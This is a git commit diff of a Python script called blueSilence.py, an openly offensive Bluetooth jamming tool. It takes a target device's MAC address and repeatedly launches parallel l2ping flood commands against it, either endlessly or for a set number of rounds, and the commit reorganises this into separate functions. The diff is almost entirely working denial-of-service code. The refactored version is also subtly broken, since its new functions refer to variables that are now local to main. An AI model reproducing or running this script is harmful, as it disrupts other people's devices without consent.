792df4afbd93a1f28eb73dba8a901ef01004bcc0
void <fluffy.siberian.cat@gmail.com>
2023-10-29 11:23:20 +1000

    new fix

--- blueSilence.py
+++ blueSilence.py
@@ -11,32 +11,45 @@ subprocess.Popen(BTService, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shel
 time = 999
 
 
-def main():
+def endless_jamming():
     try:
-        time = 999
-        print(" ")
-        interface = input("Your BT interface : ")
-        mac = input("MAC of target: ")
-        user_input = input("Do you want endless jamming? (yes/no): ")
-        if user_input.lower() in ["yes", "y"]:
-            print("Start jamming...")
-            while 1 != 0:
-                xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
-                xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
-                xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
-                subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        else:
-            print("We will give them chance...")
-            while time != 0:
-                xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
-                xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
-                xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
-                subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                time -= 1
-    except Exception as e:
-        print(" ")
+        while 1 != 0:
+            xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+            xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+            xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+            subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    except Exception as error:
+        endless_jamming()
+
+
+def limited_jamming():
+    global time
+    try:
+        while time != 0:
+            xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+            xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+            xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+            subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            time -= 1
+    except Exception as error:
+        print("See ya later")
+
+
+def main():
+    print(" ")
+    interface = input("Your BT interface : ")
+    mac = input("MAC of target: ")
+    user_input = input("Do you want endless jamming? (yes/no): ")
+    if user_input.lower() in ["yes", "y"]:
+        print("Start jamming...")
+        endless_jamming()
+    else:
+        print("We will give them chance...")
+        limited_jamming()
+
+
 main()
